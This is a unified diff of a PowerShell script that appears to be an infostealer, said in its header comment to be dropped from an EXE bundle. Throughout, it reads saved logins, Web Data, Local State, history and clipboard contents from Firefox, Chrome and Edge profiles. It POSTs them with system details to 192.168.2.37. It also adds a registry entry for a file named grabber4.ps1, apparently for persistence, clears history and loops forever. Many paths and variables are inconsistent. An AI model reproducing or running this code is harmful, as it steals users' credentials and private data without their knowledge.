@@ -1,61 +1,255 @@
 #everything is in a EXE bundle to build python to drop this script correctly.
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-$var += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date
+$var += Get-NetIPConfiguration
+$var += Get-ComputerInfo
+$var += whoami
+$var += Get-Date
 
 $var += Get-WinSystemLocale
 
 $URI = "192.168.2.37:80"
 
-if (Test-Path -Path "FireFox") { 
-    $var += FIREFOX EXISTS!
-    $FireFox = "True"
-    $var += cat -Path "Firefox/UserData/Default/Login Data"; $var += cat -Path "Firefox/User Data/Default/Web Data";$var += cat -Path "Firefox/User Data/Local State"
-    $var += cat -Path "Firefox/UserData/Profile1/Login Data"; $var += cat -Path "Firefox/UserData/Profile1/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile2/Login Data"; $var += cat -Path "Firefox/UserData/Profile2/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile3/Login Data"; $var += cat -Path "Firefox/UserData/Profile3/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile4/Login Data"; $var += cat -Path "Firefox/UserData/Profile4/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile6/Login Data"; $var += cat -Path "Firefox/UserData/Profile6/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile7/Login Data"; $var += cat -Path "Firefox/UserData/Profile7/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile8/Login Data"; $var += cat -Path "Firefox/UserData/Profile8/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile9/Login Data"; $var += cat -Path "Firefox/UserData/Profile9/Default/Web Data"
-    $var += cat -Path "Firefox/UserData/Profile10/Login Data"; $var += cat -Path "Firefox/UserData/Profile10/Default/Web Data"
-} else {
-    $var += "FireFox does not exist"
-} 
+if (Test-Path -Path FireFox) { 
+    if (Test-Path -Path FireFox/User Data/Default/Login Data) {
+        $var += cat -Path "Firefox/User Data/Default/Login Data"; $var += cat -Path "Firefox/User Data/Local State";$var += cat -Path "Firefox/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;
+    }else{
+        $Firenormal = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 1) { 
+        $var += cat -Path "Firefox/UserData/Profile1/Login Data"; $var += cat -Path "Firefox/User Data/Profile1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $FirefoxProfile1 = Write-Output "True"
+    }else{
+        $FirefoxProfile1 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 2) { 
+        $FirefoxProfile2 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile2/Login Data"; $var += cat -Path "Firefox/User Data/Profile2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile2 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 3) { 
+        $FirefoxProfile3 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 3/Login Data"; $var += cat -Path "Firefox/User Data/Profile3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile3 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 4) { 
+        $FirefoxProfile4 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 4/Login Data"; $var += cat -Path "Firefox/User Data/Profile4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile4 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 5) { 
+        $FirefoxProfile5 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 5/Login Data"; $var += cat -Path "Firefox/User Data/Profile6/Web Data" | Select-String 
+    }else{
+        $FirefoxProfile5 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 6) { 
+        $FirefoxProfile6 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 6/Login Data"; $var += cat -Path "Firefox/User Data/Profile7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile6 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 7) {
+        $FirefoxProfile7 = Write-Output "True" 
+        $var += cat -Path "Firefox/UserData/Profile 7/Login Data"; $var += cat -Path "Firefox/User Data/Profile8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile7 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 8) { 
+        $FirefoxProfile8 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 8/Login Data"; $var += cat -Path "Firefox/User Data/Profile8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile8 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 9) { 
+        $FirefoxProfile9 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 9/Login Data"; $var += cat -Path "Firefox/User Data/Profile9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile9 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path Firefox/UserData/Profile 10) { 
+        $FirefoxProfile10 = Write-Output "True"
+        $var += cat -Path "Firefox/UserData/Profile 10/Login Data"; $var += cat -Path "Firefox/User Data/Profile10/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $FirefoxProfile10 = Write-Output "false"
+    }
+}else{ 
+    $Firefox = Write-Output "false"
+}
 
-if (Test-Path -Path "Google") {
-    $var += GOOGLE EXISTS!
-    $Chrome = "True"
-    $var += cat -Path "Google/Chrome/User Data/Default/Login Data"; $var += cat -Path "Google/Chrome/User Data/Default/Web Data";$var += cat -Path "Google/Chrome/User Data/Local State"
-    $var += cat -Path "Google/Chrome/User Data/Profile1/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile1/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile2/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile2/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile3/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile3/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile4/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile4/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile6/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile6/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile7/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile7/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile8/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile8/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile9/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile9/Default/Web Data"
-    $var += cat -Path "Google/Chrome/User Data/Profile10/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile10/Default/Web Data"
-} else {
-    $var += "Chome does not exist"
+if (Test-Path -Path Google) {
+    if (Test-Path -Path "Google/Chrome/User Data/Default/login Data") {
+        $Chromenormal = Write-Output "true"
+        $var += cat -Path "Google/Chrome/User Data/Default/Login Data";$var += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;$var += cat -Path "Google/Chrome/User Data/Local State"
+    }else{
+        $Chromenormal = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 1") { 
+        $ChromeProfile1 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 1/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile1 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 2") { 
+        $ChromeProfile2 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 2/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $ChromeProfile2 = Write-Output "false"
+    }else{
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 3") { 
+        $ChromeProfile3 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 3/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile3 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 4") { 
+        $ChromeProfile4 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 4/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile4 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 5") { 
+        $var += cat -Path "Google/Chrome/User Data/Profile 6/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile5/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile4 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 6") { 
+        $ChromeProfile6 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 6/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 6/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile6 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 7") { 
+        $ChromeProfile7 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 7/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile7 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 8") { 
+        $ChromeProfile8 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 8/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile8 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 9") { 
+        $ChromeProfile9 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile 9/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile9 = Write-Output "flase"
+    }
+    
+    if (Test-Path -Path "Google/Chrome/User Data/Profile 10") { 
+        $ChromeProfile10 = Write-Output "True"
+        $var += cat -Path "Google/Chrome/User Data/Profile10/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile 10/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $ChromeProfile10 = Write-Output "false"
+    }
+}else{
+    $Chrome = Write-Output "False"
 }  
 
-if (Test-Path -Path "Microsoft") 
-    $var += EDGE EXISTS!
-    $Edge = "True"
-    $var += cat -Path "Microsoft\Edge\User Data\Default\Login Data"; $var += cat -Path "Microsoft/Edge\User Data/Default\Web Data";$var += cat -Path "Microsoft\Edge\User Data\Default\Local State"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile1/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile1/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile2/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile2/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile3/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile3/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile4/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile4/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile6/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile6/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile7/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile7/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile8/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile8/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile9/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile9/Default/Web Data"
-    $var += cat -Path "Microsoft/Edge/User Data/Profile10/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile10/Default/Web Data"
-} else {
-    $var += "Edge does not exist"
+
+if (Test-Path -Path Microsoft) {
+    if (Test-Path -Path "Microsoft/Edge/User Data/Default/Login Data") {
+        $var += cat -Path "Microsoft/Edge/User Data/Default/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Local State"; $var += cat -Path "Microsoft/Edge/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $EdgeNormal = Write-Output "True"
+    }else{
+        $EdgeNormal = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 1/Login Data") {
+        $var += cat -Path "Microsoft/Edge/User Data/Profile1/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $EdgeProfile1 = Write-Output "True"
+    }else{
+        $EdgeProfile1 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 2/Login Data") {
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 2/Login Data"; $var += cat -Path "Microsoft/Edge /User Data/Profile 2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $EdgeProfile2 = Write-Output "True"
+    }else{
+        $EdgeProfile2 = Write-Output "false"
+    }
+
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 3/Login Data") {
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 3/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $EdgeProfile3 = Write-Output "True"
+    }else{
+        $EdgeProfile3 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 4/Login Data") {
+        $EdgeProfile4 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 4/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile3 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 5/Login Data") {
+        $EdgeProfile5 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 5/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 5/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile5 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 6/Login Data") {
+        $EdgeProfile6 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 6/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 6/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile6 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 7/Login Data") {
+        $EdgeProfile7 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 7/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile7 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 8/Login Data") {
+        $EdgeProfile8 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 8/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile8 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 9/Login Data") {
+        $EdgeProfile9 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 9/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile10 = Write-Output "false"
+    }
+    
+    if (Test-Path -Path "Microsoft/Edge/User Data/Profile 10/Login Data") {
+        $EdgeProfile10 = Write-Output "True"
+        $var += cat -Path "Microsoft/Edge/User Data/Profile 10/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile 10/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+        $EdgeProfile10 = Write-Output "false"
+    }
+}else{
+    $Edge = Write-Output "False"
 }
 
 start-sleep 4 
@@ -64,7 +258,7 @@ start-sleep 4
 
 #httpsend
 
-$Response = Invoke-WebRequest -Method Post -URI $URI -body $var -UseBasicParsing
+$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing -Timeout 10
 
 #attempt to set per
 
@@ -78,63 +272,254 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCo
     -Name "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1" `
     -Value "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1"
 
-cd..
-
 Clear-History
 
 # after 24 hours start while true statement...
 
-start-sleep 86400
-
 #core system commands to keep
+
+$stopwatch = [System.Diagnostics.Stopwatch]::new()
+$Stopwatch.Start()
 
 while($true)
 { 
-    if($FireFox -eq $True) {
-        $var += cat -Path "Firefox/UserData/Default/Login Data"; $var += cat -Path "Firefox/User Data/Default/Web Data";$var += cat -Path "Firefox/User Data/Local State"
-        $varper += cat -Path "Firefox/UserData/Profile1/Login Data"; $varper += cat -Path "Firefox/UserData/Profile1/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile2/Login Data"; $varper += cat -Path "Firefox/UserData/Profile2/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile3/Login Data"; $varper += cat -Path "Firefox/UserData/Profile3/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile4/Login Data"; $varper += cat -Path "Firefox/UserData/Profile4/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile6/Login Data"; $varper += cat -Path "Firefox/UserData/Profile6/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile7/Login Data"; $varper += cat -Path "Firefox/UserData/Profile7/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile8/Login Data"; $varper += cat -Path "Firefox/UserData/Profile8/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile9/Login Data"; $varper += cat -Path "Firefox/UserData/Profile9/Default/Web Data"
-        $varper += cat -Path "Firefox/UserData/Profile10/Login Data"; $varper += cat -Path "Firefox/UserData/Profile10/Default/Web Data"
-    } else {
-            print "null"
-    if($Chrome -eq $True) {
-        $var += cat -Path "Google/Chrome/User Data/Default/Login Data"; $var += cat -Path "Google/Chrome/User Data/Default/Web Data";$var += cat -Path "Google/Chrome/User Data/Local State"
-        $varper += cat -Path "Google/Chrome/User Data/Profile1/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile1/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile2/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile2/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile3/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile3/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile4/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile4/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile6/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile6/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile7/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile7/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile8/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile8/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile9/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile9/Default/Web Data"
-        $varper += cat -Path "Google/Chrome/User Data/Profile10/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile10/Default/Web Data"
-    } else {
-            print "null"
-    if($Edge -eq $True) {
-        $varper += cat -Path "Microsoft\Edge\User Data\Default\Login Data"; $varper += cat -Path "Microsoft/Edge\User Data/Default\Web Data";$varper += cat -Path "Microsoft\Edge\User Data\Default\Local State"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile1/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile1/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile2/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile2/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile3/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile3/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile4/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile4/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile6/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile6/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile7/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile7/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile8/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile8/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile9/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile9/Default/Web Data"
-        $varper += cat -Path "Microsoft/Edge/User Data/Profile10/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile10/Default/Web Data"
-    } else {
-            print "null"
+    $clip += Get-Clipboard
 
-    $varper += Get-ComputerInfo;whoami;Get-Date;ipconfig
+    if($Firenormal -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Default/History"
+        $varper += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+     
+    if($FireFoxProfile1 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 1/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
     
-    #http send
 
-    $Response = Invoke-WebRequest -Method Post -URI $URI -body $varper -UseBasicParsing
+    if($FireFoxProfile2 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 2/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
 
-    Start-Sleep -Seconds 86400
+    }
+    
+    if($FireFoxProfile3 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 3/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    if($FireFoxProfile4 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 4/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    if($FireFoxProfile5 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 5//History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile5/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    
+    if($FireFoxProfile6 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 6//History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile6/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    
+    if($FireFoxProfile7 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 7/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($FireFoxProfile8 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 8/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    
+    if($FireFoxProfile9 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 9/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    
+    if($FireFoxProfile10 -eq $True) {
+        $varper += cat -Path "Firefox/User Data/Profile 10/History"
+        $varper += cat -Path "Google/Chrome/User Data/Profile10/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+
+    
+    if($Edgenormal -eq $True) {
+        $varper += cat -Path "Microsoft/Edge\User Data/Default\Login Data"
+        $varper += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    
+    if($EdgeProfile1 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+
+    
+    if($EdgeProfile2 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile3 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile4 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+
+    }
+    
+    if($EdgeProfile5 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 5/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile6 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 5/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile7 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 6/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile8 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile9 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($EdgeProfile10 -eq $True) {
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile 9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+    }else{
+    
+    }
+    
+    if($Chromenormal -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Microsoft/Edge\User Data/Default\Login Data"
+    }else{
+    
+    }
+    
+    if($ChromeProfile1 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 1\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile2 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 2\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile3 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 3\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile4 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile4\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile5 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 5/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 5\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile6 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile6/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 6\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile7 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google/Chrome\User Data/Profile 7\Login Data"
+    }else{
+
+    }
+
+    if($ChromeProfile8 -eq $True) {
+        $varper += cat -Path "Google/Chrome/User Data/Profile 8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
